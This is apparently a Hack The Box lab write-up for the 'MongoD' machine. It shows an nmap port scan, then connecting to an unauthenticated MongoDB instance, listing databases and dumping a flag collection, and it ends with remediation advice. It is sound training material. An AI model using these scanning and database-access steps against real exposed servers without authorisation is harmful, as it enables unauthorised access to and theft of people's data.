# MongoD - Hack The Box

## Reconnaissance

- VPN connection established using OpenVPN

- Full port scan performed:

```bash
nmap -p- --min-rate=1000 -sV <target_IP>
```

### Result

- Port 22 open → SSH
- Port 27017 open → MongoDB

---

## Enumeration

- Connect to MongoDB service:

```bash
mongo mongodb://<target_IP>:27017
```

- List available databases:

```bash
show dbs
```

---

## Exploitation

- Select database:

```bash
use sensitive_information
```

- List collections:

```bash
show collections
```

---

## Post-Exploitation

- Retrieve data from collection:

```bash
db.flag.find().pretty()
```

- Flag obtained from database content

---

## Vulnerability

The MongoDB service is exposed without authentication.

---

## Impact

- Unauthorized access to database contents
- Sensitive data exposure
- Potential full database compromise

---

## Remediation

- Enable authentication
- Restrict access to internal network only
- Apply firewall rules
- Avoid exposing databases to the internet

---

## Skills Demonstrated

- Full port scanning with Nmap
- Database enumeration
- MongoDB interaction
- Data extraction from exposed service
